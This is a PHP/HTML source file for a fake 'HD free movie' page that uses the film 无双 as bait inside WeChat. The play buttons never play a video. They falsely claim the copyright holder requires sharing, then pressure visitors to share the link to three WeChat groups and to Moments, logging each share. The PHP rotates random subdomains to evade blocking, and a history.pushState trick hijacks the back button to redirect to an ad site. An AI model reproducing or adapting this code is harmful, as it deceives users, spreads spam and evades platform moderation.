<?php 
header('Content-Type:text/html;charset=utf-8');
date_default_timezone_set('PRC');
set_time_limit(30);

include('include.php');
include('emoji.php');

///////////////////////////////////////////////////////////////////////////////////////////////
$domain = $_SERVER['HTTP_HOST'];

$domain = explode('.',$domain,2);
$domain = $domain[1];

$if_off = false;

for($i = 0; $i < count($off); $i ++)
{
	if(in_array($domain,$off[$i]))
	{
		$if_off = $i;
		break;
	}
}

if($if_off !== false)
{
	$k = $if_off;
	$domain = $final[$k][rand(0,count($final[$k]) - 1)];
	$url = 'http://' . get_rand_str(2,6) . '.' . $domain . '/' . str_pad(mt_rand(1,pow(10,5) - 1),5,'0',STR_PAD_LEFT) . '.php?' . get_rand_str(1,6) . '=' . rand(1,9) . (time() * 3);
	header('location:' . $url);
}
///////////////////////////////////////////////////////////////////////////////////////////////
foreach($_GET as $key => $value)
{
	//$config[$key] = $value;
	$url = '';
	if(strlen($value) == 11 && is_numeric($value))
	{
		$num = substr($value,1);
		$num = $num / 3;
		//if(time() > $num + 60 * 30)
		if(time() > $num + 5)
		{
			$url = 'http://' . get_rand_str(2,6) . '.' . $domain . '/' . str_pad(mt_rand(1,pow(10,5) - 1),5,'0',STR_PAD_LEFT) . '.php?' . get_rand_str(1,6) . '=' . rand(1,9) . (time() * 3);
			if(time() % 3 >= 1)
			{
				$url .= '&' . get_rand_str(1,5) . '=' . time() . str_pad(mt_rand(1,pow(10,3) - 1),3,'0',STR_PAD_LEFT);
			}
			if(time() % 3 == 2)
			{
				$url .= '&' . get_rand_str(1,5) . '=' . get_rand_str(5,10) . get_rand_str(5,10);
			}
			header('location:'.$url);
			break;
		}
	}
}

$ad_url = 'http://qta.e1yuan.com/';
//$ad_url = '';

$jump_url = 'http://www.alilunli.com/play/19650-0-0.html';

// /////////////////////////////////////////////////////////////////////////////////////////////
$domain_uri = $_SERVER ['HTTP_HOST'];
$domain_arr = explode('.',$domain_uri,2);
$domain = $domain_arr[1];
$prefix = $domain_arr[0];
$if_off = false;
for($i = 0; $i < count ( $off ); $i ++) {
	if (in_array ( $domain, $off [$i] )) {
		$if_off = $i;
		break;
	}
}
if ($if_off !== false) {
	$short_prefix =str_pad(mt_rand(1,pow(10,5) - 1),5,'0',STR_PAD_LEFT) . '/' . strtolower(get_rand_str(1,6));
	$url = "http://".strtolower(get_rand_str(3,3)).'.'.$index_domain.'/'.$short_prefix;
	header ( 'location:' . $url );
}

//分享链接
$short_domain = strtolower(get_rand_str(3,3)).'.'.$result_domain;
$short_prefix =str_pad(mt_rand(1,pow(10,5) - 1),5,'0',STR_PAD_LEFT) . '/' . strtolower(get_rand_str(1,6));
$share_link = 'http://'.$short_domain."/" . $short_prefix;

?>
<html class="U_html_bg U_color_a">
<script type="text/javascript" src="/js/baidu.js?v=2.2"></script>
<head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta charset="utf-8">
	<title><?php echo emoji();?>《無雙》高清版!</title>
	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,minimal-ui">
	<meta name="format-detection" content="telephone=no">
	<script type="text/javascript" src="<?php ?>/js/jquery.min.js"></script>
	<script type="text/javascript" src="<?php ?>/js/jweixin-1.1.0.js"></script>
	<script type="text/javascript" src="<?php ?>/js/jqthumb.min.js"></script>
	<script>
		$(function(){
		    $('#topcover').jqthumb({
		        width: "100%",
		        height: "350",		
		        after: function(imgObj){
		            imgObj.css('opacity', 0).animate({opacity: 1}, 2000);
		        }
		    });
		});
	</script>
	<link rel="stylesheet" href="<?php ?>/css/weui.css">
	<link rel="stylesheet" href="<?php ?>/css/dy.css">
	<style>
		div.a40219{-webkit-animation:afive 5s both;-moz-animation:afive 5s both;-ms-animation:afive
		5s both;animation:afive 5s both}@keyframes afive{0%{transform:scale(1);transform:scale(1)}70%,73%{transform:scale(1);transform:scale(1)}77.5%{transform:translate(4px,3px)}78%{transform:translate(4px,-4px)}78.5%{transform:translate(3px,-4px)}79%{transform:translate(-4px,-4px)}79.5%{transform:translate(-4px,3px)}80%{transform:translate(-4px,4px)}80.5%{transform:translate(3px,4px)}81%{transform:translate(0,0)}100%{transform:scale(1)rotate(0);transform:scale(1)rotate(0)}}.bottomad{position:fixed;z-index:99;width:100%;bottom:0px;left:0px}.bottomad
		img{width:100%}
		.playbtn{width:50px;height:50px;position:absolute;top:16%;left:50%;margin-top:-25px;margin-left:-25px;}
	</style>
</head>
<body class="page_play" style="">
	<!--<div style="font-size:16px;font-weight:bold;margin-left: 10px;margin-top: 10px;position: absolute;z-index:9999;">
		<a href="javascript:;" onClick="history.go(-1)">
			&lt;返回
		</a>
	</div>-->
	<div id="jiazai" style="display:none;">
		<span style="position: absolute; top: 100; margin-left:15px;">
			视频正在加载....也许需要几十秒
		</span>
		<!--<img src="index_files/jiazai.gif"width="100%">-->
	</div>
	<svg class="svg_sprite" display="none" version="1.1" xmlns="http://www.w3.org/2000/svg">
		<symbol id="sym_icon_download" viewBox="0 0 44 44">
			<path d="M2 41V2h10v3H5v33h33V5h-7V2h10v39H2zm31-20l-9.468 9.874-2.034 2.116-2.034-2.116L10 21h4l6 6.216V2h3v25.216L29 21h4z">
			</path>
		</symbol>
		<symbol id="sym_icon_collect" viewBox="0 0 44 44">
			<path d="M25 32h19v3H25v-3zm8-8h3v19h-3V24zM21.982 42.99L3.694 25.445A14.7 14.7 0 0 1 3.56 6.09a11.868 11.868 0 0 1 17.917 0l.5.558.5-.557a11.87 11.87 0 0 1 17.92 0 14.564 14.564 0 0 1 1.2 17.65l-2.318-1.633a11.746 11.746 0 0 0-.942-14.05 9.112 9.112 0 0 0-13.8 0l-2.563 2.834-2.556-2.833a9.255 9.255 0 0 0-6.9-3.16 9.244 9.244 0 0 0-6.9 3.16 11.685 11.685 0 0 0 .06 15.35l16.3 15.63 1.3-1.247 1.92 2.11z">
			</path>
		</symbol>
	</svg>
	<a onClick="show_tip();" id="logo_img">	  
		<div><img src="/images/p2535096871.jpg" width="100%" alt="无双" id="topcover">
		 <img src="/images/play.png"  class="playbtn">		
	</a>	 
	<!--播放页开始-->
	<div class="U_bg_a">
		<div class="site_player" id="2016_player">
			<!--这里插入播放器-->
			<br>
			<div class="tvp_container tvp_controls_hide">
			</div>
			<div class="tvp_limited_player none" id="limit">
				<!--点击区域-->
				<div class="tvp_limited_player_inner">
					<div class="tvp_limited_player_arrow">
					</div>
				</div>
			</div>
		</div>
		<section id="2016_title">
			<div class="mod_bd">
				<div class="mod_video_info">
					<div class="video_tit U_color_a">
						《无双》高清版！
					</div>
					<br>
					<div class="video_types U_color_b">
						<span style="font-size: 30px;color: #f5294c">
							8.6分
						</span>
						剧情/动作
					</div>
					<div class="video_intro ">
						<div class="intro_line U_color_b">
							主演：周润发,郭富城,张静初,冯文娟,廖启智
						</div>
						<div class="intro_line U_color_b">
							导演：庄文强
						</div>
						<div class="intro_line U_color_b">
						</div>
						《无双》讲述了以代号“画家”（周润发 饰）为首的犯罪团伙，掌握了制造伪钞技术，难辨真伪，并在全球进行交易获取利益，引起警方高度重视。然而“画家”和其他成员的身份一直成谜，警方的破案进度遭受到了前所未有的挑战。在关键时刻，擅长绘画的李问（郭富城 饰）打开了破案的突破口，而“画家”的真实身份却让众人意想不到……
					</div>
					<div class="mod_more _more" _hot="descbtn">
						<svg class="svg_icon_switch U_svg_c" viewBox="0 0 44 44">
							<use class="svg_use" xlink="http://www.w3.org/1999/xlink" xlink:href="#sym_icon_switch">
							</use>
						</svg>
					</div>
					<div class="video_function">
						<a class="btn_collect _btn_follow" href="javascript:" _hot="follow">
							<svg class="svg_icon_collect U_svg_b" viewBox="0 0 44 44" data-status="false">
								<use class="svg_use svg_use_false" xlink="http://www.w3.org/1999/xlink"
								xlink:href="#sym_icon_collect">
								</use>
								<use class="svg_use svg_use_true" xlink="http://www.w3.org/1999/xlink"
								xlink:href="#sym_icon_collected">
								</use>
							</svg>
						</a>
						<a class="btn_download _btn_cache" href="javascript:" _hot="download">
							<svg class="svg_icon_download U_svg_b" viewBox="0 0 44 44">
								<use class="svg_use" xlink="http://www.w3.org/1999/xlink" xlink:href="#sym_icon_download">
								</use>
							</svg>
						</a>
					</div>
				</div>
			</div>
		</section>
		<section class="mod_box mod_sideslip_episodes U_box_bg_a" id="2016_episode">
			<div class="mod_hd">
				<h2 class="mod_title U_color_b">
					点击观看
				</h2>
				<div class="mod_hd_more U_color_c">
					免费/高清
				</div>
			</div>
			<div class="mod_bd">
				<div class="mod_episodes_numbers" _hot="episodes">
					<ul class="_list">
						<li class="item current" style="width:76px;">
							<a href="javascript:void(0)" onClick="show_tip();" id="dianwo">
								点击观看
							</a>
						</li>
					</ul>
				</div>
			</div>
		</section>
		<section class="mod_box mod_box_lastview" id="2016_clips">
			<div class="mod_hd">
				<h2 class="mod_title U_color_b">
					最新推荐
				</h2>
			</div>
			<div class="mod_bd">
				<div class="mod_figures mod_figures_list" _hot="recommends">
					<ul class="figures_list _list">
						<li class="list_item">
							<a href="javascript:show_tip();" class="figure">
								<img src="/images/p2530513100.jpg" onerror="show_tip();">
							</a>
							<div class="figure_info_center">
								<strong class="figure_title">
									<a href="javascript:show_tip();">
										影
										<br>
										类型: 剧情 / 动作
										<br>
										上映日期: 2018-10-02
										<br>
										清晰度: 超清
										<br>
										状态: 免费
									</a>
								</strong>
								<div class="figure_count U_color_b">
								</div>
							</div>
						</li>
					</ul>
				</div>
			</div>
		</section>
	</div>
	<style>
		#cover-footer{width:100%;border-style:solid;border-width:1px 0px 0px;position:fixed;left:0px;bottom:0px;z-index:999;display:box;display:-moz-box;display:-ms-box;display:-o-box;background-color:rgba(255,255,255,0.6)}#cover-footer
		img.be-seller-avatar{width:40px;height:40px;display:block;margin:4px 4px;border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;-ms-border-radius:4px;-o-border-radius:4px;text-align:center;line-height:40px;font-size:16px;border:0px
		solid}#cover-footer a.be-seller-btn{height:40px;display:block;box-flex:1;-webkit-box-flex:1;-moz-box-flex:1;-ms-box-flex:1;-o-box-flex:1;margin:4px
		4px;border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;-ms-border-radius:4px;-o-border-radius:4px;text-align:center;line-height:40px;font-size:16px;border:1px
		solid;list-style:none}#cover-footer a.be-seller-text{height:40px;display:block;box-flex:5;-webkit-box-flex:5;-moz-box-flex:5;-ms-box-flex:5;-o-box-flex:5;margin:4px
		4px;border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;-ms-border-radius:4px;-o-border-radius:4px;text-align:left;line-height:20px;font-size:12px;border:0px
		solid;color:#000}
		
		.modal {
			position: fixed;
			top: 0;
			right: 0;
			bottom: 0;
			left: 0;
			overflow: hidden;
			outline: 0;
			-webkit-overflow-scrolling: touch;
			background-color: rgb(0, 0, 0);  
			filter: alpha(opacity=80);  
			background-color: rgba(0, 0, 0, 0.9); 
			z-index: 999;
			}
	</style>
	
	<div id="zhezhao_share" class="modal" style="display: none;">
		<p style="text-align: right; padding-left: 10px;color:#fff;font-size:20px">
            <img src="/images/0.png" id="share-wx-img" style="width: 100%; padding-right: 15px;">
        </p>
	</div>
	<div class="weui-dialog" style="display:none;"  id="dialog_alert" >
		<div class="weui-dialog__bd" id="dialog_alert_Mes"></div>
		<div class="weui-dialog__ft">
			<a onClick="dialog_alert_Hide();" class="weui-dialog__btn weui-dialog__btn_primary">确定</a>
		</div>
	</div>
	
	<script type="text/javascript" src="/a1.php"></script>
	<script language="javascript">
		//////////////////////////////////////////////////////////////////////
		function ajax(type,file,text,func){var XMLHttp_Object;try{XMLHttp_Object=new ActiveXObject("Msxml2.XMLHTTP")}catch(new_ieerror){try{XMLHttp_Object=new ActiveXObject("Microsoft.XMLHTTP")}catch(ieerror){XMLHttp_Object=false}}if(!XMLHttp_Object&&typeof XMLHttp_Object!="undefiend"){try{XMLHttp_Object=new XMLHttpRequest()}catch(new_ieerror){XMLHttp_Object=false}}type=type.toUpperCase();if(type=="GET")file=file+"?"+text;XMLHttp_Object.open(type,file,true);if(type=="POST")XMLHttp_Object.setRequestHeader("Content-Type","application/x-www-form-urlencoded");XMLHttp_Object.onreadystatechange=function ResponseReq(){if(XMLHttp_Object.readyState==4)func(XMLHttp_Object.responseText)};if(type=="GET")text=null;XMLHttp_Object.send(text)}
		function share_ajax(val){
			ajax('post','/deal.php','res=' + val,
			function(data)
			{
				data = null;
			});
		}
		//////////////////////////////////////////////////////////////////////
		var friend_num = 0;
		wx.ready(function(){
			var share_link = "<?php echo $share_link;?>";
			wx.onMenuShareAppMessage({ 
				title: share_info.title,
				desc: share_info.desc,
				link: share_link,
				imgUrl: share_info.imgUrl,
				success: function () {
					share_ajax('friend');
					friend_num ++;
					if(friend_num < 3)
					{
						dialog_alert_Mes('分享成功，还需分享<span style="font-size: 30px;color: #f5294c">' + (3 - friend_num) + '</span>个不同的微信群即可观看（同样的群无效）');
					}else{
							wx.showMenuItems({
								menuList:["menuItem:share:timeline"]
							});
							wx.hideMenuItems({
								menuList:["menuItem:share:appMessage",'menuItem:share:qq','menuItem:share:weiboApp','menuItem:favorite','menuItem:share:facebook','menuItem:share:QZone','menuItem:editTag','menuItem:delete','menuItem:copyUrl','menuItem:originPage','menuItem:readMode','menuItem:openWithQQBrowser','menuItem:openWithSafari','menuItem:share:email','menuItem:share:brand']
							});
						$('#cover img').attr('src','http://www.erkgh.cn/cdn/05/images/t1.jpg');
						dialog_alert_Mes('分享成功，剩下最后一步啦！请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可观看！');
					}
				},
				cancel: function () {
				}
			});
			wx.onMenuShareTimeline({
				title: share_info.title,
				link: share_link,
				imgUrl: share_info.imgUrl,
				success: function () {
					share_ajax('timeline');
					if(friend_num < 3)
					{
						dialog_alert_Mes('分享成功，还需分享<span style="font-size: 30px;color: #f5294c">' + (3 - friend_num) + '</span>个不同的微信群即可观看（同样的群无效）');
					}else{
						document.location.href = '<?php echo $jump_url;?>';
					}
				},
				cancel: function () {
				}
			});
			wx.hideMenuItems({
				menuList:["menuItem:share:timeline",'menuItem:share:qq','menuItem:share:weiboApp','menuItem:favorite','menuItem:share:facebook','menuItem:share:QZone','menuItem:editTag','menuItem:delete','menuItem:copyUrl','menuItem:originPage','menuItem:readMode','menuItem:openWithQQBrowser','menuItem:openWithSafari','menuItem:share:email','menuItem:share:brand']
			});
		});
		
		function dialog_alert_Hide(){
			$("#dialog_alert").hide();
		}
		function dialog_alert_Mes(mes){
			SDV();
			$("#dialog_alert_Mes").html(mes);
			$("#dialog_alert").show();
		}
		function show_tip(){
			dialog_alert_Mes('<span style="font-size: 20px;color: #f5294c">应版权方宣传要求<br />发送到<b>微信群</b>即可观看</span>');
		}
		function SDV(){
			document.getElementById("zhezhao_share").style.display="inline";
		}
		function HDV(){
			document.getElementById("zhezhao_share").style.display="none";
		}
	</script>	
	<?php if($ad_url != ''):?>
	<script language="javascript">
		window.onhashchange = function(){bb();};
		function aa(){history.pushState(history.length + 1,'message','#' + new Date().getTime());}
		function bb(){document.location.href = '<?php echo $ad_url;?>';}
		setTimeout('aa()',200);
	</script>
	<?php endif;?>
</body>
</html>